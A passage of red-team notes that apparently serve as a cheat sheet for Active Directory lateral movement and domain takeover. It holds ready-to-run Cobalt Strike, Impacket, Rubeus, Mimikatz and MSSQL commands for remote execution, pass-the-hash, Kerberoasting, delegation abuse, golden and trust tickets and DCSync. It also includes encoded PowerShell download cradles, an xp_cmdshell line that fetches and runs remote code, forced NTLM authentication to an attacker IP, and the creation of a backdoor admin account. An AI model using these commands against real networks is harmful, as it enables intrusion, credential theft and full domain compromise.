beacon> cd \\w-west-239\c$\windows\temp
beacon> upload /tmp/evil.exe
beacon> cd c:\
beacon> remote-exec wmi w-west-239 c:\windows\temp\evil.exe
beacon> connect w-west-239 4444
```

SharpWMI

```
# skip username/password to run in current context
beacon> execute-assembly /opt/tools/SharpWMI.exe action=exec computername=w-west-239 command="c:\windows\temp\evil.exe" username="vault\n.perroti" password="Passw0rd"
```

Impacket

```
# setup socks in CS
$ proxychains wmiexec.py -hashes 125j41487b0c24188af4e4fed5zcreba:125j41487b0c24188af4e4fed5zcreba b.boss@10.0.0.1
[...]
```

### PowerShell Remoting

CS

```
beacon> jump winrm64 w-west-239 peer-tcp
[...]

beacon> remote-exec winrm w-west-239 whoami; systeminfo
[...]
```

Evil-WinRM

```
# setup proxy via CS
beacon> socks 1050

#edit /etc/proxychains.conf
$ proxychains evil-winrm -i 10.0.0.3 -u administrator -H 125j41487b0c24188af4e4fed5zcreba
```

Invoke-Command

```
Invoke-Command -computername dtop23.vault.io -ScriptBlock {ipconfig /all} [-credential vault.io\b.boss]
```

### PsExec

CS

```
# jump
beacon> jump psexec64 w-west-239 peer-tcp
[...]

# remote exec
beacon> remote-exec psexec w-west-239 cmd.exe /c "net user haxor Passw0rd /add && net localgroup administrators haxor /add"
[...]
```

Impacket

```
# setup socks proxy via CS
$ proxychains psexec.py -hashes '125j41487b0c24188af4e4fed5zcreba:125j41487b0c24188af4e4fed5zcreba' 'vault.io/administrator@10.0.0.3'
```

### DCOM

```
beacon> execute-assembly /opt/tools/CsDCOM.exe -t w-west-239 -b powershell.exe -a "-enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMQAuADEAMAA2ADoAOAAwADAAMAAvAGgAbwBtAGUAJwApACkA" -m mmc20application
[...]

beacon> connect w-west-239 444
[...]
```

### Spawn

```
beacon> spawnas vault\b.boss Passw0rd peer-tcp
[...]

beacon> spawnu <pid> peer-tcp
[...]
```

### Pass the Hash

```
beacon> pth WKSTN-3\Administrator ccbe70d463aef35efd3cdf0d71416b82
```

### Resources
- https://github.com/GhostPack/SharpWMI
- https://github.com/Hackplayers/evil-winrm
- https://github.com/rasta-mouse/MiscTools
- https://github.com/iomoath/sharpstrike

## SharpShell

```
beacon> execute-assembly /opt/tools/SharpShell.exe return Shell.PowerShellExecute("whoami");
[...]

beacon> execute-assembly /opt/tools/SharpShell.exe var av = SCM.GetService("w-west-239","WinDefend"); return av.Status.ToString();
```

### Resources
- https://github.com/dwmkerr/sharpshell

## Foreign Listeners

CS -> MSF

```
# setup msf handler & create new CS listener to point to msf handler
beacon> spawn msf-listener
[...]
```

MSF -> CS

```
# In CS, Attacks -> Packages -> Payload Generator -> Raw
msf5> use post/windows/manage/shellcode_inject
msf5> set session 1
msf5> set shellcode /root/payload.bin
msf5> run
```

## GPO

Enumerate SIDs that can create new GPOs

```
# get SID
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=vault,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# convert SID
beacon> powerpick ConvertFrom-SID S-1-5-21-2765823697-1816233505-1834004910-1706
[...]
```

Enumerate principals that can write to GP-Link

```
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

# find computers
beacon> powerpick Get-DomainComputer | ? { $_.DistinguishedName -match "OU=1868" -or $_.DistinguishedName -match "OU=5415" } | select DnsHostName
```

Create new GPO

```
# new
beacon> powershell New-GPO -Name 'Likesss' | New-GPLink -Target 'OU=1668,OU=Workstations,DC=vault,DC=io'
[...]

# configure
beacon> execute-assembly /tools/SharpGPOAbuse.exe --AddComputerTask --TaskName "Likesss" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c powershell -nop -w hidden -enc SQBF[...]ACkA" --GPOName "Likesss"
```

### Resources
- https://github.com/FSecureLABS/SharpGPOAbuse

### Linux SSH

#### ControlMaster SSH Pivot

Create the config in `~/.ssh/config` or `/etc/ssh/ssh_config`

```
Host *
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlMaster auto
    ControlPersist 10m
```

Connect

```
ssh -S /home/vault/.ssh/controlmaster/vault@192.168.83.45\:22 vault@192.168.83.45
```

#### SSH-Agent Pivot

Grab the connection's PID with `ps` or `ptrace`

```
# sets attacker's current privileged user’s SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l

SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh vault@linuxvictim
```

### Linux Ansible

#### Ad-hoc Commands

```
ansibleadm@controller:~$ ansible victims -a "whoami"
linuxvictim | CHANGED | rc=0 >>
ansibleadm

ansibleadm@controller:~$ ansible victims -a "hostname"
linuxvictim | CHANGED | rc=0 >>
linuxvictim

ansibleadm@controller:~$ ansible victims -a "whoami" --become
linuxvictim | CHANGED | rc=0 >>
root
```

### Linux Kerberos

#### Keytab

Keytab files contain the Kerberos principal name and encrypted keys. They allow for a script or user to auth to Kerberos without a password. Commonly used in cron jobs. 

Steal keytab

```
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
```

#### Credential Cache File Basics

Search for credential cache file

```
env | grep KRB5CCNAME
```

Request a Kerberos ticket-granting-ticket (TGT)

```
kinit # enter password
```

List tickets currently stored in the user's credential cache

```
klist
```

Discard all cached tickets

```
kdestroy
```

Renew within renewal timeframe

```
kinit -R
```

#### Import Credential Cache Files

Set KRB5CCNAME evn var

```
export KRB5CCNAME=/tmp/krb5cc_minenow
```

Request a service ticket

```
kvno MSSQLSvc/DC01.corp1.com:1433
```

#### Leverage Kerberos tickets from Linux

Leverage Kerberos to interact with the domain. Add domain controller to /etc/hosts & use proxychains to come from correct source. 

Use `-k` and `--no-pass` with impacket tools.

```
# Install Kerberos linux client utilities
apt install krb5-user

# ldap
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName

# smb
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
proxychains smbclient '\\10.9.0.200\share$' -U 'vault.local/bob%357e1382f274f51526f1e263cef0f67d' --pw-nt-hash
```
# impacket get AD users
proxychains GetADUsers.py -all -k -no-pass -dc-ip 172.16.83.168 complyedge.com/pete

# impacket get SPNs
proxychains GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator

# impacket psexec
proxychains psexec.py pete@dmzdc01.complyedge.com -k -no-pass
```

#### Ticket Convert

```
root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

# need to base64 decode first
root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```

## MSSQL

### Discovery with AD

SetSPN

```
> setspn -T corp1 -Q MSSQLSvc/*
```

Impacket

```
GetUserSPNs.py -dc-ip 192.168.83.5 corp1.com/admin:lab
```

### UNC Path Hash Theft

Force an auth request

```
EXEC master..xp_dirtree "\\<attacker ip>\\test";
```

Capture

```
responder -I tun0
```

Relay

```
ntlmrelayx.py --no-http-server -smb2support -t 192.168.83.6 -c 'powershell -exec bypass -enc JABk[...]AAoA
```

### Impersonation

#### Login Level

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

Test

```
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
```

#### Database User Level 

Two pre-reqs:
1. user has been granted impersonation
2. db user can only perform actions on a given db (impersonation of a user w/ sysadmin role membership in a db does not necessarily lead to server-wide sysadmin role membership)

To fully compromise the server, the db user we imperonsate must be in a db that has the `TRUSTWORTHY` propery set

```
use msdb; EXECUTE AS USER = 'dbo'; SELECT SYSTEM_USER;
```

### Command Execution

#### xp_cmdshell

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell whoami
```

##### Enable RPC Server

```
EXEC sp_serveroption 'sql03', 'rpc', 'true'; EXEC sp_serveroption 'sql03', 'rpc out', 'true';
```

#### sp_OACreate & sp_OAMethod

```
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + sysCmd + "\"';
```

#### Stored Procedure Custom Assembly

DB has to have TRUSTWORTHY property set

```
# SQL Prep Summary
use msdb
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'clr enabled',1
RECONFIGURE
EXEC sp_configure 'clr strict security', 0
RECONFIGURE

# SQL Import 
# CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;

# Create Procedure
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

# exec
EXEC cmdExec 'whoami'
```

PS Convert Assembly to Hex

```
$assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder
$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
```

#### Query Links

OpenQuery

```
select version from openquery("dc01", 'select @@version as version')
```

Enable RPC and exec_cmdshell for execution

```
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;
SELECT * FROM OPENQUERY(\"DC01\", 'select @@servername; exec xp_cmdshell ''powershell -enc [...]''');
```

Execute on links of links. 

```
EXEC ('sp_linkedservers') AT DC01

select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')

EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01
```

---

## 7. Full Control

### Enumeration

#### PowerView

```
# import
. .\PowerView.ps1

# enum ACL
Get-ObjectAcl -Identity adm

# sid convert
ConvertFrom-SID <sid>

# Local Group GPO
Get-DomainGPOLocalGroup -ResolveMembersToSIDs -domain vault.local

# Bloodhound
Invoke-Sharphound3 -Command "-c GPOLocalGroup,all -d vault.local"

# enum all ACLs
Get-ObjectAcl -Identity adm -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}

# enumerate specific object ACL
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# enum all users current user has GenericAll to
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# enum all groups user has access GenericAll to
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# enum for genericwrite on computer object
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

### ACE Abuse

#### GenericAll

Abuse GernicAll ACL over Group object

```
# change user password
net user testservice1 h4x /domain

# add user to group
net group testgroup adm /add /domain
```

#### WriteDacl

```
# add GenericAll using WriteDACL
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity adm -Rights All
```

#### GenericWrite

```
#Check if current user has already an SPN setted:
Get-DomainUser -Identity <UserName> | select serviceprincipalname
 
#Force set the SPN on the account:
Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}

#nab SPN
PS C:\Tools> $u = get-domainuser <UserName>
PS C:\Tools> $u |get-domainspnticket |fl
```

### Unconstrained Delegation

Enumerate

```
Get-DomainComputer -Unconstrained
```

#### Mimikatz Exploitation

```
privilege::debug

# list
sekurlsa::tickets

# dump
seurlsa::tickets /export

# pass the ticket
kerberos::ptt <ticket>.kirbi
```

#### Printer Bug

```
# enumerate
ls \\dc01\pipe\spoolss

# rubeus in monitor mode
.\Rubeus.exe monitor /interval:5 /filteruser:CDC01$

#Launch print spooler
.\SpoolSample.exe CDC01 APPSRV01

# Pass the ticket
.\Rubeus.exe ptt /ticket:doIFIj

# dcsync
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

### Constrained Delegation

```
# generate TGT
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

# impersonsate
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt /ticket:[...]

# OR impersonate using ntlm
.\Rubeus s4u /user:web01$ /rc4:75ba1a138dc1f86cf18b69968f801021 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt

# impersonate and modify service
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt /ticket:[...] /altservice:cifs

# impacket impersonate 
getST.py -dc-ip 10.9.0.1 -spn 'cifs/dc.vault.local' -impersonate 'administrat' 'vault.local/attackersystem$:Summer2018!'
```

### Resource Based Constrained Delegation (RBCD)

This attack can be used to abuse: GenericAll, GenericWrite, WriteProperty, or WriteDACL on computer object

```
# find computer objects current user has GenericWrite to
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# nab computer account hash to exploit (or create a computer)
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
```

Create computer and use hash in exploit

```
# enumerate ms-DS-MachineAccountQuota
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota

# get a computer account hash or create computer account
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

# instantiate a SecurityDescriptor object
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

# convert to byte array
$SDbytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDbytes,0)

# obtain handle to victim computer object
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# check it
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0

$Descriptor.DiscretionaryAcl
```

#### Resources
- [RBCD_takeover_example.ps1 - harmj0y](https://gist.github.com/HarmJ0y/a1ae1cf09e5ac89ee15fb3da25dcb10a)
- [Delegating Like a Boss: Abusing Kerberos Delegation in Active Directory](https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/)

### Forests and Trusts

#### Enumeration

```
# enumerate
nltest /trusted_domains

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

Get-DomainTrust -API

Get-DomainTrust -NET

Get-DomainTrust

# users
Get-DomainUser -Domain corp1.com
```

Map forest trusts

```
# c#
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# powerview manually
> Get-DomainTrust -Domain corp1.com

# powerview automatically
> Get-DomainTrustMapping

# map foreign users
> Get-DomainUser -Domain corp2.com |select-object -property samaccountname |fl

# get foreign group membership
> Get-DomainForeignGroupMember -Domain corp2.com

# cross forest golden ticket requires
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE

# golden ticket also requires group with SID less than 1000 due to SID filtering
```

##### BloodHound

```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

##### PowerUpSQL

```
# auth
beacon> make_token vault.io\mssql_svc Passw0rd

# import
beacon> powershell-import /tools/PowerUpSQL/PowerUpSQL.ps1

# find
beacon> powershell Get-SQLInstanceDomain

# check access
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest

# get details
beacon> powershell Get-SQLServerInfo -Instance 'sql01.vault.io,1433'

# query
beacon> powershell Get-SQLQuery -Instance 'sql01.vault.io,1433' -Query 'select @@servername'

# execute system command
beacon> powerpick Invoke-SQLOSCmd -Instance 'sql-1.vault.io,1433' -Command 'dir C:\' -RawResults

# access via client
beacon> socks 1050
$ proxychains socat TCP4-Listen:1433,fork TCP:10.0.0.20:1433
cmd.exe> runas /netonly /user:VAULT\mssql_svc "C:\Program Files\HeidiSQL\heidisql.exe"
```

##### Cobalt Strike

```
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainTrust -Domain child.vault.io
beacon> powerpick Get-DomainComputer -Domain child.vault.io | select DnsHostName
beacon> execute-assembly /tools/SharpHound.exe -c all -D child.vault.io
```

BloodHound

(analysis pre-build queries)
"Users with Foreign Domain Group Membership"

Kerberoast

```
beacon> execute-assembly c:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /domain:child.vault.io
```

Golden Ticket + SID History

```
# SIDS (new domain)
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainGroup -Identity 'Domain Admins' -Domain parent.vault.io | select ObjectSid
[...]

# SID
beacon> powerpick ConvertTo-SID 'child\administrator'

# update, use /ptt instead of /ticket to skip storing file
beacon> mimikatz kerberos::golden /user:Administrator /domain:dev.vault.io /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:1b1baa15534dbd2f6e9de344e6d17ffe /ticket:vl.kirbi

# download
beacon> download vlt.kirbi
beacon> kerberos_ticket_use /tmp/vlt.kirbi
```

### Golden Ticket

Extra SIDs with krbtgt

```
# get krbtgt ntlm
.\mimikatz.exe "lsadump::dcsync /domain:local.dom.com /user:prod\krbtgt"

# get SIDs
PS C:\Tools> Get-DomainSID -Domain local.dom.com
S-1-5-21-634106289-3621871093-708134407

PS C:\Tools> Get-DomainSID -Domain dom.com
S-1-5-21-1587569303-1110564223-1586047116

# pass the ticket (add "-519" for Enterprise Admin SID)
.\mimikatz "kerberos::golden /user:fake /domain:local.dom.com /sid:<local.dom.com SID> /krbtgt:<ntlm hash> /sids:<dom.com SID>-519 /ptt" exit
```

Extra SIDs with TRUST account - Forging Kerberos Trust Tickets Across Trusts

```
# get the 2 SIDs
> Get-DomainSID -Domain local.dom.com
S-1-5-21-634106289-3621871093-708134407

> Get-DomainSID -Domain dom.com
S-1-5-21-1587569303-1110564223-1586047116

# get the trust account ntlm hash
.\mimikatz.exe "lsadump::dcsync /domain:local.dom.com /user:dom$"

# forge the ticket
> .\mimikatz.exe "kerberos::golden /domain:dom.com /sid:<dom sid> /sids:<dom sid>-519 /rc4:TRUSTNTLM /user:fake /service:krbtgt /target:local.dom.com /ticket:trust.kirbi" exit

# get TGS for target service and export
> .\kekeo.exe "tgs::ask /tgt:c:\tools\trust.kirbi /service:cifs/dc.dom.com"

# pass the ticket
> .\Rubeus.exe ptt /ticket:c:\tools\TGS_fake@dom.com_cifs~dc.dom.com@DOM.COM.kirbi

# check
> dir \\dc.dom.com\c$
```

Resource: [It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts](https://adsecurity.org/?p=1588)

### MSSQL

#### Linked MSSQL in the Forest

```
# enumerate 
> setspn -T prod -Q MSSQLSvc/*
```

Search for linked databases:
```
select * from master..sysservers
```

```
Get-SQLServerLink -Instance instance -Verbose
```

Run queries on linked databases:
```
select * from openquery("instance",'select * frommaster..sysservers')
```

Run queries on chain of linked databases:
```
select * from openquery("inatance1",'select * from openquery("instance2",''select * from master..sysservers'')')
```

```
Get-SQLServerLinkCrawl -Instance instance1 -Verbose
```

If `rpcout` is enabled for all links (disabled by default), `xp_cmdshell` can be enabled using:

```
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "instance2")
```

Command execution with linked databases:

```
select * from openquery("instance1",'select * from
openquery("instance2",''select * from openquery("instance3",''''select @@version as version;exec master..xp_cmdshell "cmd /c calc.exe"'''')'')')
```

```
Get-SQLServerLinkCrawl -Instance instance1 -Query "exec master..xp_cmdshell 'cmd /c calc.exe'"-Verbose
```

[source](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/5-lateral-movement.md#database-links)



#### Client

Using Heidi

```
# test
SELECT @@version

# check
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

# enable
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE

# exec
EXEC xp_cmdshell 'whoami'

```

#### Links

CS

```
beacon> powershell Get-SQLServerLinkCrawl -Instance 'sql-1.vault.io,1433'
[...]

beacon> powershell Get-SQLServerLinkCrawl -Instance 'sql-1.vault.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl
```

Client (Hiedi)

```
# show links
SELECT * FROM master..sysservers

# execute queries on link
SELECT * FROM OPENQUERY("sql02.vault.external", 'select @@servername')

# Enable xp_cmdshell 
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql02.vault.io]

EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql02.vault.io]

SELECT * FROM OPENQUERY("sql02.vault.io", 'select * from sys.configurations where name = ''xp_cmdshell''')

# Enable xp_cmdshell **via** openquery
SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')

# This can also be nested (potentially coming back to the own server with different permissions)
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT SERVER1') AT SERVER2
EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -exec bypass -c "iex(iwr http://<ip>/run.txt -usebasicparsing)"'''';'') AT SERVER1') AT SERVER2

SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')

# scripted web delivery
SELECT * FROM OPENQUERY("sql02.vault.io", 'select @@servername; exec xp_cmdshell ''powershell -enc [...snip...]''')

# get command output
# run Get-MpThreatDetection | Out-File -FilePath C:\Windows\Temp\out.txt and get output
SELECT * FROM OPENQUERY("sql02.vault.io", 'select * from openquery("sql01.vault.io", ''select * from openrowset(bulk N''''C:\Windows\Temp\defenderlog.txt'''', single_nclob) as contents'')')
```

#### Resources
- [Attacking SQL Server CLR Assemblies](https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/)
- [Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [Hacking SQL Server Stored Procedures – Part 2: User Impersonation](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [Hacking SQL Server Stored Procedures – Part 3: SQL Injection](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)
- [Lateral movement through Microsoft SQL Server links](https://hackmag.com/security/lateral-movement/)
- [The dangers of MSSQL features – Impersonation & Links](https://improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links)
- [Using SQL Server for attacking a Forest Trust](http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html)
- [How to Hack Database Links in SQL Server!](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
- [Database Links Cheat Sheet](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/5-lateral-movement.md)
- [MSSQL - OSEP Code Snippets](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [XCT MSSQL Notes](https://notes.vulndev.io/notes/redteam/payloads/windows/mssql)

### Kerberos

#### Kerberoasting

Hunt with PowerView

```
beacon> powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
beacon> powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
[...]
```

Kerberoast using Rubeus

```
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast
[...]
```

impacket

```
# setup socks proxy
beacon> socks 1050
[...]

# from linux terminal 
$ proxychains /usr/local/bin/GetUserSPNs.py -target-domain vault -usersfile kerberoast_able-users.txt -request -dc-ip 10.0.0.1 'vault/s.user:Passw0rd'

# crack
$ hashcat -a 0 -m 18200 [...]
```

#### ASREPRoasting

Hunt with PowerView

```
beacon> Get-DomainUser -PreauthNotRequired -Properties SamAccountName
```

Impacket

```
proxychains GetNPUsers.py vault.io/ -usersfile users.txt -dc-ip 10.0.0.1
```

Kerbrute

```
$ kerbrute userenum --dc 10.0.0.1 -d vault.io users.txt
```

Rubeus

```
beacon> execute-assembly /opt/tools/Rubues.exe asreproast /format:hashcat
[...]
```

Crack

```
$ hashcat -a 0 -m 13100
```

#### Unconstrained Delegation

Find computers assigned unconstrained delegation

```
# CS
beacon> powershell-import /opt/tools/PowerSploit/PowerView.ps1
beacon> Get-DomainComputer -Unconstrained -Properties DnsHostName
[...]

# BloodHound
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# shortest path to unconstrained from owned
MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

From the unconstrained machine

```
# Rubeus list tickets
beacon> execute-assembly /opt/tools/Rubeus.exe triage

# Rubeus dump all
beacon> execute-assembly /opt/tools/Rubeus.exe dump /nowrap

# Rubeus dump specific
beacon> execute-assembly /opt/tools/Rubeus.exe dump /luid:/0x[...] /nowrap

# new process, not pid and luid
beacon> execute-assembly /opt/tools/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
[...]

# ptt
beacon> execute-assembly /opt/tools/Rubeus.exe ptt /luid:0x[...] /ticket:[...]

# Impersonate
beacon> steal_token <pid>
```

#### Printer Bug

```
# monitor
beacon> execute-assembly /opt/tools/Rubeus.exe monitor /internal:10 /nowrap

# exploit
beacon> execute-assembly /opt/tools/SpoolSample.exe dc01.vault.io www03.vault.io
[...]

# Rubeus announces new TGT
Found new TGT:
[...]

# Save to disk
PS > [System.IO.File]::WriteAllBytes("C:\Users\sysadm\Desktop\dc01.kirbi", [System.Convert]::FromBase64String("dceIFGjCCBRagAwIBBaEDAgEWooIE[...snip...]rt0Z3QbDUNZQkVSQk9USUMuSv8="))

# import
beacon> kerberos_ticket_use c:\users\sysadm\desktop\dc01.kirbi
```

#### Resources
- https://github.com/ropnop/kerbrute

#### Constrained Delegation

```
# recon
beacon> powerpick Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
[...]

# krbtgt ticket
beacon> execute-assembly /tools/Rubeus.exe dump /service:krbtgt /nowrap
[...]

# impersonate - /altservice option for request of tickets for any service being run by target computer
beacon> execute-assembly /tools/Rubeus.exe s4u /impersonateuser:n.marco /msdsspn:cifs/fs03.vault.io /ticket:doI[...]5JTw== /nowrap
[...]

# check it
beacon> execute-assembly /tools/Rubeus.exe describe /ticket:[...]

# sacraficial process - note luid and process id
beacon> execute-assembly /tools/Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe
[...]

# impoprt
beacon> execute-assembly /tools/Rubeus.exe ptt /luid:0x3a11332 /ticket:doIGW[...]

# steal
beacon> steal_token 440
[...]
```

#### Resources
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
